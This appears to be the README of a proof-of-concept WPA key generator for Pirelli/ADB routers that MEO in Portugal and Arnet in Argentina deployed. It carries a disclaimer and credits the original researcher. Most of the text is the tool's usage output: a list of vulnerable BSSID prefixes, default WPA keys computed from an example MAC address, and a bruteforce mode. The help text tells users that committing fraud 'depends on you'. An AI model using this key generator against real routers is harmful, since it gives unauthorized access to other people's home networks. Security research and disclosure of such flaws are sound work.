Vulnerabilidades nos Routers ADB Italia da MEO. 
==

+ Este algoritmo permite gerar as chaves de encriptação WPA pré-definidas nos Routers da MEO com o SSID "ADSLPT-ABXXXXX"

Referencias
----

* O autor do codigo é [Eduardo Novella](https://twitter.com/enovella_) que encontrou a vulnerabilidade nos routers ADB utilizado na Argentina pela operadora Arnet. O codigo neste repositorio encontra-se modificado de modo a funcionar nos routers da MEO

Aviso
----
Não me responsabilizo por qualquer problema que lhe possa causar o uso indevido deste codigo, seja de que forma for. Este codigo serve apenas para testar a segurança das redes WiFi

Licence
----
GPLv3
http://gplv3.fsf.org/

Mais info info
----

+ http://ednolo.alumnos.upv.es/?p=1883

Usage pirelli
----

	$ python pirelli.py -v
	pirelli.py 1.4 [2015-05-06] ----> http://www.ednolo.alumnos.upv.es

	$ python pirelli.py 
	usage: pirelli.py [-h] [-b [BSSID]] [-v] [-l | -a]

	>>> PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina and MEO in
	Portugal. So far only WiFi networks with essids like WiFi-Arnet-XXXX or
	ADSLPT-ABXXXXX and manufactured by Pirelli are likely vulnerable. See
	http://ednolo.alumnos.upv.es/ for more details. Twitter: @enovella_ and email:
	ednolo[at]inf.upv.es. This software is used just as proof-of-concept, commit
	fraud depends on you!

	optional arguments:
	  -h, --help            show this help message and exit
	  -v, --version         show program's version number and exit
	  -l, --list            List all vulnerable targets
	  -a, --allkeys         Bruteforce mode

	required:
	  -b [BSSID], --bssid [BSSID]
	                        Target mac address

	(+) Help: python pirelli.py -b 74:88:8B:AD:C0:DE

	$ python pirelli.py -l
	[+] Possible vulnerable targets so far:
		 bssid: 00:08:27:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:13:C8:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:17:C2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:19:3E:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:1C:A2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:1D:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:22:33:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:8C:54:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 30:39:F2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 74:88:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 84:26:15:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: A4:52:6F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: A4:5D:A1:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: D0:D4:12:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: D4:D1:84:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: DC:0B:1A:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: F0:84:2F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX

	$ python pirelli.py -b 74:88:8B:AD:C0:DE
	[+] MAC     : 74:88:8B:AD:C0:DE
	[+] WPA key : 057mjyggor	SSID: WiFi-Arnet-XXXX (Argentina)
	[+] WPA key : 057mjygg  	SSID: ADSLPT-ABXXXXX  (Portugal)

	$ python pirelli.py -b 74:88:8B:AD:C0:DE -a
	[+] MAC     : 74:88:8B:AD:C0:DE

	[+] WPA keys for SSID: WiFi-Arnet-XXXX (Argentina)
	3c1nrhqy5z
	tugh1hcfog
	057mjyggor
	hj0wl2c2r7
	9yw6um3tc5
	ituqajo8iq
	wfti5odq8c

	[+] WPA keys for SSID: ADSLPT-ABXXXXX  (Portugal)
	3c1nrhqy  
	tugh1hcf  
	057mjygg  
	hj0wl2c2  
	9yw6um3t  
	ituqajo8  
	wfti5odq 